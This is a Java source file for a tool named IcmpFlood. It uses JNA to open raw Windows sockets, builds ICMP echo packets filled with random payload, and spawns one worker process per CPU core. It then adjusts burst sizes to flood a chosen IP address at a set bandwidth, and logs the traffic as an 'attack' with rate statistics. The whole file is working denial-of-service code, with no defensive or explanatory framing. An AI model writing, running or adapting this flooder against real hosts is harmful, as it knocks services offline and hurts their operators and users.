package com.yourpackage;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.Structure;

public class IcmpFlood {
    private static final Logger logger = LogManager.getLogger(IcmpFlood.class);
    private static final int PACKET_SIZE = 1472;
    private static final int NUM_PROCESSES = Runtime.getRuntime().availableProcessors();
    private static final int PACKETS_PER_BURST = 2048;
    
    private volatile boolean stopAttack = false;
    private final String targetIp;
    private final long bytesPerSecond;
    private final List<Process> activeProcesses = new ArrayList<>();
    private final AtomicLong totalPacketsSent = new AtomicLong(0);
    private final Random random = new Random();
    private long startTime;
    
    interface WS2_32 extends Library {
        WS2_32 INSTANCE = Native.load("ws2_32", WS2_32.class);
        int socket(int af, int type, int protocol);
        int sendto(int socket, byte[] buf, int len, int flags, SockAddrIn to, int tolen);
        int closesocket(int socket);
        int inet_addr(String cp);
    }

    @Structure.FieldOrder({"sin_family", "sin_port", "sin_addr", "sin_zero"})
    public static class SockAddrIn extends Structure {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public byte[] sin_zero = new byte[8];
    }

    @Structure.FieldOrder({"Type", "Code", "Checksum", "Id", "Sequence"})
    public static class ICMPHeader extends Structure {
        public byte Type;
        public byte Code;
        public short Checksum;
        public short Id;
        public short Sequence;
    }

    public IcmpFlood(String targetIp, long bytesPerSecond) {
        this.targetIp = targetIp;
        this.bytesPerSecond = bytesPerSecond;
    }

    private short calculateChecksum(byte[] buf) {
        int length = buf.length;
        int i = 0;
        long sum = 0;
        while (length > 1) {
            sum += ((buf[i] << 8) & 0xFF00) | (buf[i + 1] & 0xFF);
            i += 2;
            length -= 2;
        }
        if (length > 0) {
            sum += (buf[i] << 8) & 0xFF00;
        }
        while ((sum >> 16) > 0) {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        return (short) ~sum;
    }

    public void start() {
        logger.info("Starting ICMP flood attack against {} with target rate of {} bytes/sec", 
            targetIp, bytesPerSecond);
        
        long bytesPerProcess = bytesPerSecond / NUM_PROCESSES;
        
        try {
            String javaHome = System.getProperty("java.home");
            String javaBin = javaHome + File.separator + "bin" + File.separator + "java";
            String classpath = System.getProperty("java.class.path");
            
            List<Process> processes = new ArrayList<>();
            for (int i = 0; i < NUM_PROCESSES; i++) {
                ProcessBuilder builder = new ProcessBuilder(
                    javaBin,
                    "-cp", classpath,
                    "com.yourpackage.IcmpWorker",
                    targetIp,
                    String.valueOf(bytesPerProcess),
                    String.valueOf(i)
                );
                
                builder.inheritIO();
                Process process = builder.start();
                processes.add(process);
            }
            
            // Add all processes at once to avoid concurrent modification
            activeProcesses.addAll(processes);
            
            // Wait for stop signal instead of waiting for processes
            while (!stopAttack) {
                Thread.sleep(100);
            }
        } catch (Exception e) {
            logger.error("Critical error during attack execution: ", e);
            stop();
        }
    }

    public void startWorker() {
        sendPackets(bytesPerSecond);
    }

    private void sendPackets(long threadBytesPerSecond) {
        int sock = WS2_32.INSTANCE.socket(2, 3, 1);
        if (sock < 0) {
            logger.error("Failed to create raw socket");
            return;
        }

        try {
            int numPackets = 64;
            byte[][] packets = new byte[numPackets][PACKET_SIZE];
            ICMPHeader[] headers = new ICMPHeader[numPackets];
            
            for (int i = 0; i < numPackets; i++) {
                packets[i] = new byte[PACKET_SIZE];
                random.nextBytes(packets[i]);
                
                headers[i] = new ICMPHeader();
                headers[i].Type = 8;
                headers[i].Code = 0;
                headers[i].Id = (short) random.nextInt(65535);
                headers[i].Sequence = (short) i;
                headers[i].Checksum = 0;
                headers[i].write();
                System.arraycopy(headers[i].getPointer().getByteArray(0, 8), 0, packets[i], 0, 8);
                headers[i].Checksum = calculateChecksum(packets[i]);
                headers[i].write();
                System.arraycopy(headers[i].getPointer().getByteArray(0, 8), 0, packets[i], 0, 8);
            }
            
            SockAddrIn sockaddr = new SockAddrIn();
            sockaddr.sin_family = 2;
            sockaddr.sin_addr = WS2_32.INSTANCE.inet_addr(targetIp);
            sockaddr.write();

            int burstSize = PACKETS_PER_BURST;
            long localPacketsSent = 0;
            startTime = System.nanoTime();
            int packetIndex = 0;

            while (!stopAttack) {
                for (int burst = 0; burst < burstSize && !stopAttack; burst++) {
                    for (int i = 0; i < 1024; i++) {
                        WS2_32.INSTANCE.sendto(sock, packets[packetIndex], PACKET_SIZE, 0, sockaddr, sockaddr.size());
                        packetIndex = (packetIndex + 1) % numPackets;
                        localPacketsSent++;
                    }
                }

                long currentTime = System.nanoTime();
                double elapsedSeconds = (currentTime - startTime) / 1_000_000_000.0;
                
                if (elapsedSeconds >= 0.1) {
                    double currentRate = (localPacketsSent * PACKET_SIZE * 8.0) / (elapsedSeconds * 1_000_000);
                    double targetRate = (threadBytesPerSecond * 8.0) / 1_000_000;

                    if (currentRate < targetRate * 0.95) {
                        burstSize = Math.min(burstSize * 2, 256000);
                    } else if (currentRate > targetRate * 1.05) {
                        burstSize = Math.max(burstSize / 2, 16000);
                    }

                    totalPacketsSent.addAndGet(localPacketsSent);
                    localPacketsSent = 0;
                    startTime = currentTime;
                }
            }
        } finally {
            WS2_32.INSTANCE.closesocket(sock);
        }
    }

    public void stop() {
        stopAttack = true;
        for (Process process : new ArrayList<>(activeProcesses)) {
            try {
                ProcessHandle.of(process.pid())
                    .ifPresent(handle -> handle.descendants()
                        .forEach(ProcessHandle::destroyForcibly));
                process.destroyForcibly();
                process.waitFor(2, TimeUnit.SECONDS);
            } catch (Exception e) {
                // Ignore cleanup errors
            }
        }
        activeProcesses.clear();
    }

    public class AttackStats {
        private final double currentRate;
        private final double targetRate;
        private final long totalPackets;
        private final double totalDataSent;
        
        public AttackStats(double currentRate, double targetRate, long totalPackets, double totalDataSent) {
            this.currentRate = currentRate;
            this.targetRate = targetRate;
            this.totalPackets = totalPackets;
            this.totalDataSent = totalDataSent;
        }

        public double getCurrentRate() {
            return currentRate;
        }

        public double getTargetRate() {
            return targetRate;
        }

        public long getTotalPackets() {
            return totalPackets;
        }

        public double getTotalDataSent() {
            return totalDataSent;
        }
    }

    public AttackStats getStats() {
        long currentPacketCount = totalPacketsSent.get();
        double currentRate = (currentPacketCount * PACKET_SIZE * 8.0) / 
            ((System.nanoTime() - startTime) / 1_000_000_000.0 * 1_000_000);
        double targetRate = (bytesPerSecond * 8.0) / 1_000_000;
        double totalData = currentPacketCount * PACKET_SIZE / (1024.0 * 1024.0);
        
        return new AttackStats(currentRate, targetRate, currentPacketCount, totalData);
    }

    public void updateStats(Jenkins jenkins) {
        long currentPacketCount = totalPacketsSent.get();
        double currentRate = (currentPacketCount * PACKET_SIZE * 8.0) / ((System.nanoTime() - startTime) / 1_000_000_000.0) / 1_000_000;
        double targetRate = (bytesPerSecond * 8.0) / 1_000_000;
        double totalDataSent = currentPacketCount * PACKET_SIZE;
        
        jenkins.logAttackStats("ICMP", targetIp, currentRate, targetRate, currentPacketCount, totalDataSent);
    }
} 